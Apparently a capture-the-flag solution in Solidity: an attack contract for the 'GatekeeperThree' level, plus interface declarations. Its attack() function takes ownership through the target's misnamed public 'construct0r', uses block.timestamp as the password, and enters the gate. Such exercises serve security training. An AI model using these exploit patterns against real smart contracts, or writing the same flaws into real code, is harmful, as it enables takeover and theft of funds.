// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "./interfaces/IGatekeeperThree.sol";

contract GateBreakerThree {
    GatekeeperThreeInterface private gatekeeperThree;

    constructor(address _gatekeeperThree) {
        gatekeeperThree = GatekeeperThreeInterface(_gatekeeperThree);
    }

    function attack() public {
        gatekeeperThree.construct0r();
        gatekeeperThree.createTrick();
        gatekeeperThree.getAllowance(block.timestamp);
        gatekeeperThree.enter();
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface SimpleTrickInterface {
    function checkPassword(uint _password) external returns (bool);

    function trickInit() external;

    function trickyTrick() external;

    function target() external view returns (GatekeeperThreeInterface target);

    function trick() external view returns (address trick);
}

interface GatekeeperThreeInterface {
    function construct0r() external;

    function getAllowance(uint _password) external;

    function createTrick() external;

    function enter() external returns (bool entered);

    function owner() external view returns (address owner);

    function entrant() external view returns (address entrant);

    function allow_enterance() external view returns (bool allow_entrance);

    function trick() external view returns (SimpleTrickInterface trick);
}